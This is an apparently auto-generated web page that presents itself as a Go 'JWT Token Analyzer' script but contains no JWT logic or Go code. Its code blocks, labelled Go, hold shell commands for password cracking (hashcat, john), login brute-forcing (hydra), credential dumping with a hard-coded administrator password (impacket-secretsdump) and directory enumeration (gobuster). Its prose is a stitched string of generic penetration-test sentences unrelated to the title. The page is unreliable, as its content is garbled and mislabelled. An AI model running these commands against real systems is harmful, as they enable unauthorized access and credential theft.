---
TitleSEO: "JWT Token Analyzer in Go | ZureFX"
TitlePost: "JWT Token Analyzer — Go"
Author: "ZureFX"
Description: "A Go script for jwt token analyzer. Built for security research and automation."
Keywords: "tool, fuzzer, script, powershell, python, go"
URL: "https://zurefx.github.io/scripting/script-jwt-token-analyzer-212.html"
URL_IMAGES: ""
Date: "2024-07-01"
Tags: "Tool, Fuzzer, Script, PowerShell, Python, Go"
Section: "scripting"
Lang: "en"
main_img: "script-jwt-token-analyzer-212"
Permalink: "/scripting/script-jwt-token-analyzer-212.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `sharphound`
- `smbexec`
- `chisel`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.9.110 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.92.233.159
```

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```go
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.113.37 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.85.173.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.150.85
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

Initial enumeration revealed several interesting open ports on the target. The service was running without proper input validation, leading to injection vulnerabilities.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 27.33s
```
